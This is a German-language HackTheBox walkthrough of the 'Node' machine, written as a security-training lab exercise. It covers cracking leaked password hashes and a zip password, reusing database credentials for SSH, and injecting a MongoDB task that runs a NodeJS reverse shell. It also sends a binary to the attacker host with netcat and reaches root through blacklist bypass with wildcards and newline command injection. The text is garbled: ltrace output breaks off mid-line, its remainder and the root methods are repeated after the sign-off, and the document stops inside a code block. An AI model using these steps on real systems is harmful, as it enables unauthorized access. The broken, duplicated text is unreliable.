---
title: "HackTheBox - Node WriteUp | Tipps + Anleitung"
date: 2018-03-09T12:10:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
  - german
---

[Node](https://www.hackthebox.eu/home/machines/profile/110) ist eine der schwierigeren CTF Challenges von [HackTheBox](https://hackthebox.eu/). Grundlegendes Wissen im Bereich Reverse Engineering und Datenbanken wird benötigt.

[![bewertung](https://imgur.com/LY2focA.jpg)](https://imgur.com/LY2focA)

## **Tipps**

- Sieh dir den Seitenquelltext genau an.
- Wenn der Download abbricht, versuche einen anderen Browser, benutze Burp als Proxy oder kopiere den Seitenquelltext.
- [ltrace](https://en.wikipedia.org/wiki/Ltrace) (zum debuggen) und [radare2](https://en.wikipedia.org/wiki/Radare2) (zur Analyse des Assembly Codes) können dich an's Ziel bringen.
- Um an **/root/root.txt** zu kommen gibt es 3 verschiedene Methoden.

## **Video**

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/Kc-J_RgBauI/0.jpg)](http://www.youtube.com/watch?v=Kc-J_RgBauI)

## **Anleitung**

Als erstes machen wir wie gewohnt einen Nmap-Scan.

```shell
root@kali:~# nmap -A 10.10.10.58

[...]
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
| 256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_ 256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (EdDSA)
3000/tcp open  http    Node.js Express framework
| hadoop-datanode-info:
|_ Logs: /login
|_hadoop-jobtracker-info:
| hadoop-tasktracker-info:
|_ Logs: /login
|_hbase-master-info:
|_http-title: MyPlace
[...]
```

2 offene Ports wurden gefunden. SSH und auf **Port 3000** eine **Node.js** Webseite.

Wenn wir uns den Seitenquelltext ansehen, können wir ganz unten Verweise auf Javascripts finden.

```html
<script type="text/javascript" src="vendor/jquery/jquery.min.js"></script>
<script type="text/javascript" src="vendor/bootstrap/js/bootstrap.min.js"></script>
<script type="text/javascript" src="vendor/angular/angular.min.js"></script>
<script type="text/javascript" src="vendor/angular/angular-route.min.js"></script>
<script type="text/javascript" src="assets/js/app/app.js"></script>
<script type="text/javascript" src="assets/js/app/controllers/home.js"></script>
<script type="text/javascript" src="assets/js/app/controllers/login.js"></script>
<script type="text/javascript" src="assets/js/app/controllers/admin.js"></script>
<script type="text/javascript" src="assets/js/app/controllers/profile.js"></script>
<script type="text/javascript" src="assets/js/misc/freelancer.min.js"></script>
```

Sehen wir uns **home.js** mal an.

```javascript
var controllers = angular.module('controllers');

controllers.controller('HomeCtrl', function ($scope, $http) {
  $http.get('/api/users/latest').then(function (res) {
    $scope.users = res.data;
  });
});
```

In Zeile 4 wird auf **/api/users/latest** zugegriffen. Unter 10.10.10.58:3000/api/users/latest sehen wir 3 Benutzer mit ihrer jeweiligen **_id**, **username**, **password** und **is_admin**. Wobei das **password** jeweils ein [Hash](https://www.security-insider.de/was-ist-ein-hash-a-635712/) zu seien scheint.

Allerdings ist hier keiner der Benutzer ein Admin. Sehen wir uns darum mal **/api/users/** an.

[![credentials](https://imgur.com/CC4dErP.jpg)](https://imgur.com/CC4dErP)

Hier ist ein Admin Account zu sehen und zwar **myP14ceAdm1nAcc0uNT**. Kopieren wir uns den Hash und benutzen einen Online Hash Cracker um zu sehen, ob wir das Password herausfinden können. Ich benutze dafür [crackstation.net](https://crackstation.net/).

```shell
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af = manchester
```

Tatsächlich konnte es das Passwort herausfinden.

Melden wir uns nun als **myP14ceAdm1nAcc0uNT** mit dem Passwort **manchester** an und laden uns das Backup herunter.

[![backup](https://imgur.com/hz7pBLx.jpg)](https://imgur.com/hz7pBLx)

Falls der Download bei dir immer wieder abbrechen sollte gibt es 3 Möglichkeiten wie du dieses beheben kannst.

1.  Versuche einen anderen Browser
2.  Benutze Burp als Proxy
3.  Kopiere den Inhalt von [view-source:http://10.10.10.58:3000/api/admin/backup](http://view-source:http://10.10.10.58:3000/api/admin/backup)s

Wenn wir uns den Inhalt von **myplace.backup** ansehen, können wir sehen, dass es mit [Base64](https://de.wikipedia.org/wiki/Base64) enkodiert wurde. Wir können **base64 -d** benutzen, um es zu dekodieren.

```shell
root@kali:~# cat myplace.backup | base64 -d > myplace
```

Sehen wir uns nun den Dateityp von der Datei **myplace** an, mit der Hilfe von **file**.

```shell
root@kali:~# file myplace
myplace: Zip archive data, at least v1.0 to extract
```

Es handelt sich um eine Zip Datei.

Nennen wir myplace zu myplace.zip um.

```shell
root@kali:~# mv myplace myplace.zip
```

Allerdings wird ein Passwort benötigt um die Zip Datei zu öffnen.

Das Password der Zip Datei können wir bruteforcen. Ich benutze dafür [fcrackzip](http://oldhome.schmorp.de/marc/fcrackzip.html) und die **rockyou** Wortliste, welche sich bei Kali Linux standardmäßig unter **/usr/share/wordlists/rockyou.txt** befindet.

```shell
root@kali:~# fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace.zip
possible pw found: magicword ()
```

Das Passwort ist also **magicword**.

Jetzt können mir **myplace.zip** entpacken.

```shell
root@kali:~# unzip myplace.zip
[...]
root@kali:~# cd var/www/myplace
root@kali:~# ls
app.html app.js mark node_modules package.json package-lock.json static
```

Sehen wir uns **app.js** genauer an.

```javascript
root@kali:~# cat app.js

const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const crypto = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID = require('mongodb').ObjectID;
const path = require("path");
const spawn = require('child_process').spawn;
const app = express();
const url = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
[...]
```

Es wird anscheinend [MongoDB](https://www.mongodb.com/de) und der Nutzername **mark** mit dem Passwort **5AYRft73VtFpc84k** um sich bei [MongoDB](https://www.mongodb.com/de) anzumelden.

Probieren wir diese Anmeldedaten bei **SSH** aus.

```shell
root@kali:~# ssh mark@10.10.10.58
[...]
mark@node:~$
```

Es hat tatsächlich funktioniert.

```shell
mark@node:~$ ls /home
frank mark tom
```

Unter **/home** sind noch 2 andere Benutzer zu finden. **frank** und **tom**.

```shell
mark@node:~$ ps aux | grep tom
tom 1224 0.0 5.7 1008560 43964 ? Ssl 05:06 0:06 /usr/bin/node /var/scheduler/app.js
tom 1231 3.2 8.1 1034224 61784 ? Ssl 05:06 12:28 /usr/bin/node /var/www/myplace/app.js
```

2 Prozesse gehören **tom**. Sehen wir uns **/var/scheduler/app.js** an.

```shell
mark@node:~$ cat /var/scheduler/app.js

const exec = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID = require('mongodb').ObjectID;
const url = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

**app.js** sucht in der Datenbank **tasks** nach Einträgen (Zeile 15)  und führt den Inhalt in **cmd** als Shellbefehl aus (Zeile 19-21).

Da wir die Anmeldedaten für die Datenbank haben und somit neue Einträge machen können, können wir dafür sorgen, dass z.B. ein Reverse Shell Skript ausgeführt wird.

Ich benutze dieses [NodeJS Reverse Shell Skript](https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell#the-nodejs-reverse-shell) dafür.

Als nächstes nur noch NetCat Port 4444 abhören lassen und IP Adresse und Port im Skript dementsprechend ändern.

```shell
root@kali:~# nc -lnvp 4444
```

Unter /tmp/ können wir das Skript dann mithilfe von VI(M) einfügen.

```shell
mark@node:~$ vi /tmp/reverse.js
```

Nun können wir uns mit der Datenbank verbinden.

```shell
mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler

Failed global initialization: BadValue Invalid or no user locale set. Please ensure LANG and/or LC_* environment variables are set correctly.
```

Wenn du diese Fehlermeldung bekommen solltest benutze folgendes.

```shell
mark@node:~$ export LC_ALL=C
```

So. 2\. Versuch.

```shell
mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler

> db.tasks.insert({cmd: "/usr/bin/node /tmp/reverse.js"})
{
"acknowledged" : true,
"insertedId" : ObjectId("5a8d1e6cf84b3aa4294de40d")
}

```

Durch **db.tasks.insert({cmd: "/usr/bin/node /tmp/reverse.js"})** machen wir einen neuen Eintrag in der Datenbank **tasks**. **cmd**bekommt dabei den Wert **/usr/bin/node /tmp/reverse.js**, welcher dafür sorgt, dass node unser Reverse Shell Skript ausführt. Zeile 4-6 ist die Bestätigung, dass der Eintrag erfolgreich war.

Jetzt nur noch ein wenig warten, bis unser Eintrag ausgeführt wurde und wir haben Zugriff als **tom**.

```shell
tom@node:/$
```

```shell
tom@node:/$ find / -perm -u=s 2>/dev/null

/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/local/bin/backup
/usr/bin/chfn
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newuidmap
/bin/ping
/bin/umount
/bin/fusermount
/bin/ping6
/bin/ntfs-3g
/bin/su
/bin/mount
```

**find / -perm -u=s** durchsucht alle Dateien, nach welchen die von jedem Benutzer ausgeführt werden können und dann die effektive UID des Benutzers der Datei haben. Mehr Informationen dazu kannst du [hier](http://www.zettel-it.de/docs/SUID-SGID-und-Sticky-Bit.pdf) finden. **2>/dev/null** sorgt einfach dafür, dass alle Fehlermeldungen (z.B. bei Zugriff verweigert) zu [/dev/null](https://de.wikipedia.org/wiki//dev/null) umgeleitet werden. [/dev/null](https://de.wikipedia.org/wiki//dev/null) verwirft jegliche Daten, die dorthin geschrieben werden.

**/usr/local/bin/backup** sieht unüblich aus.

```shell
tom@node:/$ cd  /usr/local/bin
tom@node:/usr/local/bin$ file backup

backup: setuid ELF 32-bit LSB exeutable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter  /lib/ld-linux.so.2,  for GNU/Linux 2.6.32, BuildID[sha1]=343cf2d93fb2905848a42007439494a2b4984369,  not stripped
```

**/usr/local/bin/backup **ist eine [ELF](https://de.wikipedia.org/wiki/Executable_and_Linking_Format) Datei.

Laden wir uns die Datei herunter um sie uns genauer ansehen zu können.

```shell
root@kali:~# nc -lnvp 8888 > backup

root@kali:~# ifconfig tun0
[...]
inet 10.10.14.52 netmask 255.255.254.0 destination 10.10.14.52
[...]

tom@node:/usr/local/bin$ nc 10.10.14.52 8888 < backup
```

Mit [ltrace](https://en.wikipedia.org/wiki/Ltrace) können wir das Programm debuggen.

```shell
root@kali:~# chmod +x backup

root@kali:~# ltrace ./backup
__libc_start_main(0x80489fd, 1, 0xffb9ac24, 0x80492c0 <unfinished ...>
geteuid() = 0
setuid(0) = 0
exit(1 <no return ...>
+++ exited (status 1) +++
```

Das Programm beendet mit dem **Status  1 **und macht sonst nichts nennenswertes. Benutzen wir [radare2](https://en.wikipedia.org/wiki/Radare2) um uns den Assembly Source Code anzusehen.

```shell
root@kali:~# r2 backup

[0x08048780]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[0x08048780]> afl
0x080485a8 3 35 sym._init
0x080485e0 1 6 sym.imp.strstr
0x080485f0 1 6 sym.imp.strcmp
0x08048600 1 6 sym.imp.printf
0x08048610 1 6 sym.imp.strcspn
0x08048620 1 6 sym.imp.fgets
0x08048630 1 6 sym.imp.fclose
0x08048640 1 6 sym.imp.time
0x08048650 1 6 sym.imp.geteuid
0x08048660 1 6 sym.imp.strcat
0x08048670 1 6 sym.imp.strcpy
0x08048680 1 6 sym.imp.getpid
0x08048690 1 6 sym.imp.puts
0x080486a0 1 6 sym.imp.system
0x080486b0 1 6 sym.imp.clock
0x080486c0 1 6 sym.imp.exit
0x080486d0 1 6 sym.imp.srand
0x080486e0 1 6 sym.imp.strchr
0x080486f0 1 6 sym.imp.__libc_start_main
0x08048700 1 6 sym.imp.fopen
0x08048710 1 6 sym.imp.strncpy
0x08048720 1 6 sym.imp.rand
0x08048730 1 6 sym.imp.access
0x08048740 1 6 sym.imp.setuid
0x08048750 1 6 sym.imp.sprintf
0x08048760 1 6 sym.imp.remove
0x08048770 1 6 sub.__gmon_start___252_770
0x08048780 1 33 entry0
0x080487b0 1 4 sym.__x86.get_pc_thunk.bx
0x080487c0 4 43 sym.deregister_tm_clones
0x080487f0 4 53 sym.register_tm_clones
0x08048830 3 30 sym.__do_global_dtors_aux
0x08048850 4 43 -> 40 entry1.init
0x0804887b 1 197 sym.mix
0x08048940 1 63 sym.displayWarning
0x0804897f 1 63 sym.displaySuccess
0x080489be 1 63 sym.displayTarget
0x080489fd 50 2237 sym.main
0x080492c0 4 93 sym.__libc_csu_init
0x08049320 1 2 sym.__libc_csu_fini
0x08049324 1 20 sym._fini
[0x08048780]> vvv
```

Nachdem wir **aaa** (analysiere alles), **afl** (liste alle Funktionen auf) und dann **vvv** (gehe in den Visuellen Modus) eingegeben haben, sehen wir folgendes.

[![radare2](https://imgur.com/QfUQFIz.jpg)](https://imgur.com/QfUQFIz)

Wählen wir nun **sym.main** mit Hilfe der Pfeiltasten aus. Jetzt 2x **g** drücken und dann **Leertaste**. Wenn wir nun etwas runtergehen sehen wir folgendes.

[![radare2](https://imgur.com/bI8gzC0.jpg)](https://imgur.com/bI8gzC0)

**cmp dword [ebx], 3** ( Das Register **ebc** wird mit dem Wert **3** verglichen )  
**jg 0x8048a44;[gc]** ( Wenn **ebx größer oder gleich 3** ist, wird das Programm weiter ausgeführt, ansonsten wird es beendet.)

Eventuell möchte das Programm 3 (oder mehr) Argumente haben.

( Mit **q** kannst du radare2 wieder beenden )

Probieren wir nun das Programm mit 3 Argumenten aus.

```shell
root@kali:~# ltrace ./backup arg1 arg2 arg3

__libc_start_main(0x80489fd, 4, 0xffa26dc4, 0x80492c0 <unfinished ...>
geteuid() = 0
setuid(0) = 0
strcmp("arg1", "-q") = 1

[...]

strncpy(0xffab3ad8, "arg2", 100) = 0xffab3ad8
strcpy(0xffab3ac1, "/") = 0xffab3ac1
strcpy(0xffab3acd, "/") = 0xffab3acd
strcpy(0xffab3a57, "/e") = 0xffab3a57
strcat("/e", "tc") = "/etc"
strcat("/etc", "/m") = "/etc/m"
strcat("/etc/m", "yp") = "/etc/myp"
strcat("/etc/myp", "la") = "/etc/mypla"
strcat("/etc/mypla", "ce") = "/etc/myplace"
strcat("/etc/myplace", "/k") = "/etc/myplace/k"
strcat("/etc/myplace/k", "ey") = "/etc/myplace/key"
strcat("/etc/myplace/key", "s") = "/etc/myplace/keys"
fopen("/etc/myplace/keys", "r") = 0
strcpy(0xffab26a8, "Could not open file\n\n") = 0xffab26a8
printf(" %s[!]%s %s\n", "\033[33m", "\033[37m", "Could not open file\n\n" [!] Could not open file

) = 37
exit(1 <no return ...>
+++ exited (status 1) +++
```

In Zeile 6 wird das erste Argument mit **-q** verglichen ( **strcmp("arg1", "-q") = 1** ). Testen wir das aus.

```shell
root@kali:~# ltrace ./backup -q arg2 arg3
__libc_start_main(0x80489fd, 4, 0xffb8b344, 0x80492c0 <unfinished ...>
geteuid() = 0
setuid(0) = 0
strcmp("-q", "-q") = 0
strncpy(0xffb8b208, "arg2", 100) = 0xffb8b208
strcpy(0xffb8b1f1, "/") = 0xffb8b1f1
strcpy(0xffb8b1fd, "/") = 0xffb8b1fd
strcpy(0xffb8b187, "/e") = 0xffb8b187
strcat("/e", "tc") = "/etc"
strcat("/etc", "/m") = "/etc/m"
strcat("/etc/m", "yp") = "/etc/myp"
strcat("/etc/myp", "la") = "/etc/mypla"
strcat("/etc/mypla", "ce") = "/etc/myplace"
strcat("/etc/myplace", "/k") = "/etc/myplace/k"
strcat("/etc/myplace/k", "ey") = "/etc/myplace/key"
strcat("/etc/myplace/key", "s") = "/etc/myplace/keys"
fopen("/etc/myplace/keys", "r") = 0
exit(1 <no return ...>
+++ exited (status 1) +++
```

In Zeile 18 wird versucht **/etc/myplace/keys** zu lesen.

```shell
tom@node:/usr/local/bin$ cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
```

Kopieren wir uns den Inhalt und erstellen bei unserer Maschine die Datei **/etc/myplace/keys**.

```shell
root@kali:~# mkdir /etc/myplace

vi /etc/myplace/keys

a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
```

So jetzt erneut das Programm debuggen.

```shell
root@kali:~# ltrace ./backup -q arg2 arg3
__libc_start_main(0x80489fd, 4, 0xffaf3094, 0x80492c0 <unfinished ...>
geteuid() = 0
setuid(0) = 0
strcmp("-q", "-q") = 0
strncpy(0xffaf2f58, "arg2", 100) = 0xffaf2f58
strcpy(0xffaf2f41, "/") = 0xffaf2f41
strcpy(0xffaf2f4d, "/") = 0xffaf2f4d
strcpy(0xffaf2ed7, "/e") = 0xffaf2ed7
strcat("/e", "tc") = "/etc"
strcat("/etc", "/m") = "/etc/m"
strcat("/etc/m", "yp") = "/etc/myp"
strcat("/etc/myp", "la") = "/etc/mypla"
strcat("/etc/mypla", "ce") = "/etc/myplace"
strcat("/etc/myplace", "/k") = "/etc/myplace/k"
strcat("/etc/myplace/k", "ey") = "/etc/myplace/key"
strcat("/etc/myplace/key", "s") = "/etc/myplace/keys"
fopen("/etc/myplace/keys", "r") = 0x8ef1160
fgets("a01a6aa5aaf1d7729f35c8278daae30f"..., 1000, 0x8ef1160) = 0xffaf2aef
strcspn("a01a6aa5aaf1d7729f35c8278daae30f"..., "\n") = 64
strcmp("arg2", "a01a6aa5aaf1d7729f35c8278daae30f"...) = -1
fgets("45fac180e9eee72f4fd2d9386ea7033e"..., 1000, 0x8ef1160) = 0xffaf2aef
strcspn("45fac180e9eee72f4fd2d9386ea7033e"..., "\n") = 64
strcmp("arg2", "45fac180e9eee72f4fd2d9386ea7033e"...) = -1
fgets("3de811f4ab2b7543eaf45df611c2dd25"..., 1000, 0x8ef1160) = 0xffaf2aef
strcspn("3de811f4ab2b7543eaf45df611c2dd25"..., "\n") = 64
strcmp("arg2", "3de811f4ab2b7543eaf45df611c2dd25"...) = -1
fgets("\n", 1000, 0x8ef1160) = 0xffaf2aef
strcspn("\n", "\n") = 0
strcmp("arg2", "") = 1
fgets("", 1000, 0x8ef1160) = 0
exit(1 <no return ...>
+++ exited (status 1) +++
```

Das zweite Argument wird mit 3 verschiedenen Strings verglichen. Benutzen wir das Argument **-s 100** für **ltrace** um die Länge der anzuzeigenden Strings zu erhöhen.

```shell
root@kali:~# ltrace -s 100 ./backup -q arg2 arg3
__libc_start_main(0x80489fd, 4, 0xffe7ff14, 0x80492c0 <unfinished ...>
geteuid() = 0
setuid(0) = 0
strcmp("-q", "-q") = 0
strncpy(0xffe7fdd8, "arg2", 100) = 0xffe7fdd8
strcpy(0xffe7fdc1, "/") = 0xffe7fdc1
strcpy(0xffe7fdcd, "/") = 0xffe7fdcd
strcpy(0xffe7fd57, "/e") = 0xffe7fd57
strcat("/e", "tc") = "/etc"
strcat("/etc", "/m") = "/etc/m"
strcat("/etc/m", "yp") = "/etc/myp"
strcat("/etc/myp", "la") = "/etc/mypla"
strcat("/etc/mypla", "ce") = "/etc/myplace"
strcat("/etc/myplace", "/k") = "/etc/myplace/k"
strcat("/etc/myplace/k", "ey") = "/etc/myplace/key"
strcat("/etc/myplace/key", "s") = "/etc/myplace/keys"
fopen("/etc/myplace/keys", "r") = 0x8820160
fgets("a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508\n", 1000, 0x8820160) = 0xffe7f96f
strcspn("a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508\n", "\n") = 64
strcmp("arg2", "a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508") = -1
fgets("45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474\n", 1000, 0x8820160) = 0xffe7f96f
strcspn("45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474\n", "\n") = 64
strcmp("arg2", "45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474") = -1
fgets("3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110\n", 1000, 0x8820160) = 0xffe7f96f
strcspn("3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110\n", "\n") = 64
strcmp("arg2", "3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110") = -1
fgets("\n", 1000, 0x8820160) = 0xffe7f96f
strcspn("\n", "\n") = 0
strcmp("arg2", "") = 1
fgets("", 1000, 0x8820160) = 0
exit(1 <no return ...>
+++ exited (status 1) +++
```

Das 2\. Argument wird also mit den Strings aus **/etc/myplace/keys** verglichen.

Benutzen wir nun einen der 3 Strings aus **/etc/myplace/keys** als 2\. Argument.

```shell
root@kali:~# ltrace -s 100 ./backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 arg3
__libc_start_main(0x80489fd, 4, 0xffb1c9e4, 0x80492c0 <unfinished ...>
geteuid() = 0
setuid(0) = 0
strcmp("-q", "-q") = 0
strncpy(0xffb1c8a8, "a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508", 100) = 0xffb1c8a8
strcpy(0xffb1c891, "/") = 0xffb1c891
strcpy(0xffb1c89d, "/") = 0xffb1c89d
strcpy(0xffb1c827, "/e") = 0xffb1c827
strcat("/e", "tc") = "/etc"
strcat("/etc", "/m") = "/etc/m"
strcat("/etc/m", "yp") = "/etc/myp"
strcat("/etc/myp", "la") = "/etc/mypla"
strcat("/etc/mypla", "ce") = "/etc/myplace"
strcat("/etc/myplace", "/k") = "/etc/myplace/k"
strcat("/etc/myplace/k", "ey") = "/etc/myplace/key"
strcat("/etc/myplace/key", "s") = "/etc/myplace/keys"
fopen("/etc/myplace/keys", "r") = 0x9881160
fgets("a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508\n", 1000, 0x9881160) = 0xffb1c43f
strcspn("a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508\n", "\n") = 64
strcmp("a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508", "a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508") = 0
fgets("45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474\n", 1000, 0x9881160) = 0xffb1c43f
strcspn("45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474\n", "\n") = 64
strcmp("a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508", "45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474") = 1
fgets("3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110\n", 1000, 0x9881160) = 0xffb1c43f
strcspn("3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110\n", "\n") = 64
strcmp("a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508", "3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110") = 1
fgets("\n", 1000, 0x9881160) = 0xffb1c43f
strcspn("\n", "\n") = 0
strcmp("a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508", "") = 1
fgets("", 1000, 0x9881160) = 0
strstr("arg3", "..") = nil
strstr("arg3", "/root") = nil
strchr("arg3", ';') = nil
strchr("arg3", '&') = nil
strchr("arg3", '`') = nil
strchr("arg3", '
```

Das 3\. Argument gibt also an, von welchem Verzeichnis ( oder welcher Datei ) eine Zip Datei erstellt werden soll. Dafür wird der Befehl **system()** benutzt. Außerdem wird das 3\. Argument mit **.. /root ; & ` $ | //** und **/etc** verglichen. Wenn das 3\. Argument einen dieser Strings enthält, bekommen wir eine Zip Datei, welche nur ein Trollface enthält.

Jetzt gibt es verschiedene Methoden wie wir vorgehen können.

## 1\. Wildcards

Das ist die einfachste Methode. Wir wollen an den Inhalt von **/root/root.txt**, aber **/root** ist auf der Blacklist. Um diese zu entgehen können wir [Wildcards](https://wiki.ubuntuusers.de/Bash/#Wildcards) benutzen.

```shell
tom@node:/usr/local/bin$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /r??t/r??t.txt
```

oder

```shell
tom@node:/usr/local/bin$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /r*t/r*t.txt
```

## 2\. Newline

Zuerst ändern wir den Port bei unserem Reverse Shell Skript **/tmp/reverse.js**. Dann lassen wir NetCat diesen Port abhören.

```shell
nc -lnvp 4445
```

Jetzt können wir als 3\. Argument **\n** benutzen, damit **system()** einen weiteren Befehl ausführt. Z.B. unser Skript.

```shell
tom@node:/usr/local/bin$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
```

```shell
nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.10.14.52] from (UNKNOWN) [10.10.10.58] 55838
whoami
root
python -c "import pty; pty.spawn('/bin/bash')"

root@node:/usr/local/bin# cat /root/root.txt
172#########ZENSIERT#########be0

root@node:/usr/local/bin# cat /home/tom/user.txt
e11#########ZENSIERT#########1b1
```

## 3\. Buffer Overflow

Es wird mehrmals **strcpy** aufgerufen, allerdings wird nicht die Begrenzung überprüft. In der **displayTarget** Funktion tritt dann ein **overflow** und ein **segfault** auf. Damit dies passiert müssen folgende 3 Kriterien erfüllt werden.

1.  Das 1\. muss ungleich **-q** sein, damit das Programm nicht im quiet mode gestartet wird.
2.  Das 2\. Argument muss einen gültigen Key enthalten
3.  Das 3\. Argument enthält einen 508 characters langen String.

Vielen Dank für's durchlesen. :)

```shell
) = nil strchr("arg3", '|') = nil strstr("arg3", "//") = nil strcmp("arg3", "/") = 1 strstr("arg3", "/etc") = nil strcpy(0xffb1c24b, "arg3") = 0xffb1c24b getpid() = 6034 time(0) = 1520597049 clock(0, 0, 0, 0) = 7799 srand(0x4885486b, 0xc864d874, 0x4885486b, 0x804918c) = 0 rand(0, 0, 0, 0) = 0xb41e2b0 sprintf("/tmp/.backup_188867248", "/tmp/.backup_%i", 188867248) = 22 sprintf("/usr/bin/zip -r -P magicword /tmp/.backup_188867248 arg3 > /dev/null", "/usr/bin/zip -r -P magicword %s %s > /dev/null", "/tmp/.backup_188867248", "arg3") = 65 system("/usr/bin/zip -r -P magicword /tmp/.backup_188867248 arg3 > /dev/null" <no return ...> --- SIGCHLD (Child exited) --- <... system resumed> ) = 3072 access("/tmp/.backup_188867248", 0) = -1 remove("/tmp/.backup_188867248") = -1 fclose(0x9881160) = 0 +++ exited (status 0) +++
```

Das 3\. Argument gibt also an, von welchem Verzeichnis ( oder welcher Datei ) eine Zip Datei erstellt werden soll. Dafür wird der Befehl **system()** benutzt. Außerdem wird das 3\. Argument mit **.. /root ; & ` $ | //** und **/etc** verglichen. Wenn das 3\. Argument einen dieser Strings enthält, bekommen wir eine Zip Datei, welche nur ein Trollface enthält.

Jetzt gibt es verschiedene Methoden wie wir vorgehen können.

## 1\. Wildcards

Das ist die einfachste Methode. Wir wollen an den Inhalt von **/root/root.txt**, aber **/root** ist auf der Blacklist. Um diese zu entgehen können wir [Wildcards](https://wiki.ubuntuusers.de/Bash/#Wildcards) benutzen.

```shell
tom@node:/usr/local/bin$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /r??t/r??t.txt
```

oder

```shell
tom@node:/usr/local/bin$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /r*t/r*t.txt
```

## 2\. Newline

Zuerst ändern wir den Port bei unserem Reverse Shell Skript **/tmp/reverse.js**. Dann lassen wir NetCat diesen Port abhören.

```shell
nc -lnvp 4445
shell
```

Jetzt können wir als 3\. Argument **\n** benutzen, damit **system()** einen weiteren Befehl ausführt. Z.B. unser Skript.

```shell
